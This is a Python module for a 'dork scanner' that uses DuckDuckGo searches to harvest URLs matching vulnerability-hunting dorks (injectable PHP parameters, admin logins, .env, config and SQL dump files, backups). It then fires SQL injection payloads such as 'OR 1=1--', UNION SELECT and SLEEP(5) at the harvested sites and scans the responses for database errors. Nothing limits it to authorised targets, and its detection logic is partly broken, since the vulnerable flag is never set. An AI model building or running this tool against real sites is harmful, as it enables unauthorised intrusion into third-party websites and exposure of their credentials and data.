"""
Dork Scanner Tool Module
Handles Google dorking and vulnerability scanning
"""

import re
from typing import List, Dict, Tuple, Optional
from datetime import datetime
import requests
import time
from urllib.parse import urljoin
from .progress_logger import ProgressLogger, LogLevel

try:
    from ddgs import DDGS
except ImportError:
    try:
        from duckduckgo_search import DDGS
    except ImportError:
        DDGS = None


class DorkScanner:
    """Dork scanner and vulnerability finder"""
    
    def __init__(self):
        self.scan_results = []
        self.dork_list = []
        self.vulnerable_urls = []
        self.collected_urls = []
        self.logger = ProgressLogger()
    
    # ==================== Dork List Parsing ====================
    def load_dork_file(self, filepath: str) -> Tuple[bool, int]:
        """Load dork list from file"""
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                self.dork_list = [line.strip() for line in f if line.strip()]
            return True, len(self.dork_list)
        except Exception as e:
            print(f"Error loading dork file: {e}")
            return False, 0
    
    def add_dork(self, dork: str) -> None:
        """Add single dork to list"""
        if dork.strip() and dork not in self.dork_list:
            self.dork_list.append(dork.strip())
    
    def get_dork_list(self) -> List[str]:
        """Get current dork list"""
        return self.dork_list
    
    def clear_dork_list(self) -> None:
        """Clear dork list"""
        self.dork_list = []
    
    # ==================== Common Google Dorks ====================
    def get_default_dorks(self) -> Dict[str, List[str]]:
        """Get common vulnerability-related dorks"""
        return {
            'sql_injection': [
                'inurl:".php?id="',
                'inurl:".php?page="',
                'inurl:".php?category="',
                'inurl:".php?product="',
                'inurl:".php?search="',
                'inurl:"?id=" filetype:php',
                'inurl:"?user_id=" filetype:php',
                'inurl:"?product_id=" filetype:php',
            ],
            'login_pages': [
                'inurl:login.php',
                'inurl:admin.php',
                'inurl:user.php',
                'inurl:signin',
                'inurl:authenticate',
            ],
            'sensitive_files': [
                'inurl:config.php',
                'inurl:database.php',
                'inurl:settings.php',
                'inurl:.env',
                'filetype:sql',
            ],
            'backup_files': [
                'inurl:.bak',
                'inurl:.backup',
                'inurl:.old',
                'filetype:zip',
                'filetype:rar',
            ]
        }
    
    # ==================== SQL Injection Detection ====================
    def detect_sql_injection_patterns(self, url: str) -> Dict[str, any]:
        """Detect potential SQL injection vulnerabilities in URL"""
        issues = []
        risk_score = 0
        
        # Check for parameter patterns
        param_patterns = [
            r'[?&](id|user_id|product_id|cat|page|search|q|query)=',
            r'[?&](username|login|user)=',
            r'[?&](file|path|dir)=',
        ]
        
        for pattern in param_patterns:
            if re.search(pattern, url, re.IGNORECASE):
                issues.append(f"Potential injectable parameter: {pattern}")
                risk_score += 20
        
        # Check for unsafe parameter values
        unsafe_chars = ['%', "'", '"', '+', '&', '|', ';']
        if any(char in url for char in unsafe_chars):
            issues.append("URL contains potentially unsafe characters")
            risk_score += 15
        
        # Check for common SQL injection keywords
        sql_keywords = ['union', 'select', 'where', 'and', 'or', 'drop', 'delete']
        if any(keyword in url.lower() for keyword in sql_keywords):
            issues.append("URL contains SQL keywords")
            risk_score += 30
        
        # Determine risk level
        if risk_score >= 50:
            risk_level = "High"
        elif risk_score >= 30:
            risk_level = "Medium"
        elif risk_score >= 15:
            risk_level = "Low"
        else:
            risk_level = "Very Low"
        
        return {
            'url': url,
            'risk_level': risk_level,
            'risk_score': min(risk_score, 100),
            'issues': issues,
            'timestamp': datetime.now().isoformat()
        }
    
    def test_sql_injection_payloads(self, url: str) -> Dict[str, any]:
        """Test common SQL injection payloads"""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "admin' --",
            "' UNION SELECT NULL--",
            "' AND SLEEP(5)--",
            "1' AND '1'='1",
            "1' UNION SELECT NULL,NULL--",
        ]
        
        vulnerable = False
        tested_payloads = []
        
        for payload in payloads:
            test_url = f"{url}'{payload}"
            try:
                response = requests.head(test_url, timeout=2)
                # Check for SQL error patterns in response
                tested_payloads.append({
                    'payload': payload,
                    'status_code': response.status_code,
                    'potentially_vulnerable': response.status_code in [200, 500]
                })
            except Exception as e:
                tested_payloads.append({
                    'payload': payload,
                    'error': str(e),
                    'potentially_vulnerable': False
                })
        
        return {
            'url': url,
            'tested_payloads': tested_payloads,
            'vulnerable': vulnerable
        }
    
    def check_sql_errors(self, url: str) -> Dict[str, any]:
        """Check for SQL error messages"""
        try:
            response = requests.get(url, timeout=5)
            content = response.text.lower()
            
            sql_error_patterns = [
                r"sql.*error",
                r"mysql.*error",
                r"postgresql.*error",
                r"syntax error",
                r"database error",
                r"sqlstate",
                r"odbc.*error",
                r"oracle.*error",
            ]
            
            found_errors = []
            for pattern in sql_error_patterns:
                if re.search(pattern, content):
                    found_errors.append(pattern)
            
            return {
                'url': url,
                'has_sql_errors': len(found_errors) > 0,
                'error_patterns': found_errors,
                'response_code': response.status_code
            }
        except Exception as e:
            return {
                'url': url,
                'error': str(e),
                'has_sql_errors': False
            }
    
    # ==================== URL Collection ====================
    def add_vulnerable_url(self, url: str, vulnerability_type: str, severity: str) -> None:
        """Add URL to vulnerable list"""
        record = {
            'url': url,
            'type': vulnerability_type,
            'severity': severity,
            'timestamp': datetime.now().isoformat(),
            'analysis': self.detect_sql_injection_patterns(url)
        }
        self.vulnerable_urls.append(record)
    
    def get_vulnerable_urls(self) -> List[Dict]:
        """Get list of vulnerable URLs"""
        return self.vulnerable_urls
    
    def export_vulnerable_urls(self, filepath: str, format_type: str = 'txt') -> bool:
        """Export vulnerable URLs to file"""
        try:
            if format_type == 'txt':
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write("Vulnerable URLs Report\n")
                    f.write("=" * 50 + "\n\n")
                    for record in self.vulnerable_urls:
                        f.write(f"URL: {record['url']}\n")
                        f.write(f"Type: {record['type']}\n")
                        f.write(f"Severity: {record['severity']}\n")
                        f.write(f"Timestamp: {record['timestamp']}\n")
                        f.write(f"Risk Level: {record['analysis']['risk_level']}\n")
                        f.write(f"Issues: {', '.join(record['analysis']['issues'])}\n")
                        f.write("-" * 50 + "\n\n")
            
            elif format_type == 'csv':
                import csv
                with open(filepath, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.DictWriter(f, fieldnames=['url', 'type', 'severity', 'risk_level', 'timestamp'])
                    writer.writeheader()
                    for record in self.vulnerable_urls:
                        writer.writerow({
                            'url': record['url'],
                            'type': record['type'],
                            'severity': record['severity'],
                            'risk_level': record['analysis']['risk_level'],
                            'timestamp': record['timestamp']
                        })
            
            return True
        except Exception as e:
            print(f"Error exporting URLs: {e}")
            return False
    
    def clear_vulnerable_urls(self) -> None:
        """Clear vulnerable URLs list"""
        self.vulnerable_urls = []
    
    # ==================== Dork Analysis ====================
    def analyze_dork_list(self) -> Dict[str, any]:
        """Analyze current dork list"""
        if not self.dork_list:
            return {'count': 0, 'types': {}}
        
        types = {
            'parameter_dorks': len([d for d in self.dork_list if 'inurl:' in d and '=' in d]),
            'file_dorks': len([d for d in self.dork_list if 'filetype:' in d]),
            'directory_dorks': len([d for d in self.dork_list if 'inurl:' in d and '/' in d]),
            'other': len([d for d in self.dork_list if 'inurl:' not in d and 'filetype:' not in d])
        }
        
        return {
            'total_dorks': len(self.dork_list),
            'types': types,
            'sample_dorks': self.dork_list[:5]
        }
    
    def get_scan_history(self) -> List[Dict]:
        """Get scan history"""
        return self.scan_results
    
    # ==================== Google Dorking ====================
    def scan_dorks_google(self, dorks: List[str] = None, max_results: int = 5) -> Dict[str, List[str]]:
        """Scan using DuckDuckGo to collect URLs"""
        try:
            if DDGS is None:
                msg = 'ddgs library not installed. Install with: pip install ddgs'
                self.logger.error(msg)
                return {'error': msg, 'urls': {}}
            
            if dorks is None:
                dorks = self.dork_list
            
            if not dorks:
                self.logger.error('No dorks provided')
                return {'error': 'No dorks provided', 'urls': {}}
            
            self.logger.set_total(len(dorks))
            results = {}
            ddgs = DDGS()
            
            for i, dork in enumerate(dorks):
                self.logger.info(f"Scanning dork {i+1}/{len(dorks)}: {dork}")
                try:
                    urls = []
                    search_results = ddgs.text(dork, max_results=max_results)
                    
                    for result in search_results:
                        url = result.get('href', '')
                        if url and url not in urls:
                            urls.append(url)
                            self.collected_urls.append(url)
                        if len(urls) >= max_results:
                            break
                    
                    results[dork] = urls
                    self.logger.update_progress(i+1, f"Found {len(urls)} URLs from: {dork}")
                    
                except Exception as e:
                    self.logger.warning(f"Error scanning '{dork}': {str(e)}")
                    results[dork] = []
            
            self.logger.complete(f"Scan complete! Collected {len(self.collected_urls)} total URLs")
            return results
        except ImportError as e:
            self.logger.error('duckduckgo-search not installed')
            return {'error': 'duckduckgo-search not installed', 'urls': {}}
        except Exception as e:
            self.logger.error(f"Scan error: {str(e)}")
            return {'error': str(e), 'urls': {}}
    
    def scan_single_dork(self, dork: str, max_results: int = 10) -> List[str]:
        """Scan single dork and return URLs"""
        try:
            if DDGS is None:
                self.logger.error('duckduckgo-search not installed')
                return []
            
            self.logger.info(f"Scanning single dork: {dork}")
            urls = []
            ddgs = DDGS()
            search_results = ddgs.text(dork, max_results=max_results)
            
            for result in search_results:
                url = result.get('href', '')
                if url and url not in urls and url not in self.collected_urls:
                    urls.append(url)
                    self.collected_urls.append(url)
                if len(urls) >= max_results:
                    break
            
            self.logger.success(f"Found {len(urls)} URLs")
            return urls
        except Exception as e:
            self.logger.error(f"Error scanning dork: {str(e)}")
            return []
    
    def get_collected_urls(self) -> List[str]:
        """Get all collected URLs"""
        return list(set(self.collected_urls))  # Remove duplicates
    
    def clear_collected_urls(self) -> None:
        """Clear collected URLs"""
        self.collected_urls = []
    
    def filter_urls_by_extension(self, urls: List[str], extensions: List[str]) -> List[str]:
        """Filter URLs by file extension"""
        filtered = []
        for url in urls:
            for ext in extensions:
                if url.lower().endswith(ext.lower()):
                    filtered.append(url)
                    break
        return filtered
    
    def filter_urls_by_pattern(self, urls: List[str], pattern: str) -> List[str]:
        """Filter URLs by regex pattern"""
        try:
            filtered = []
            for url in urls:
                if re.search(pattern, url, re.IGNORECASE):
                    filtered.append(url)
            return filtered
        except Exception as e:
            print(f"Error filtering URLs: {e}")
            return urls
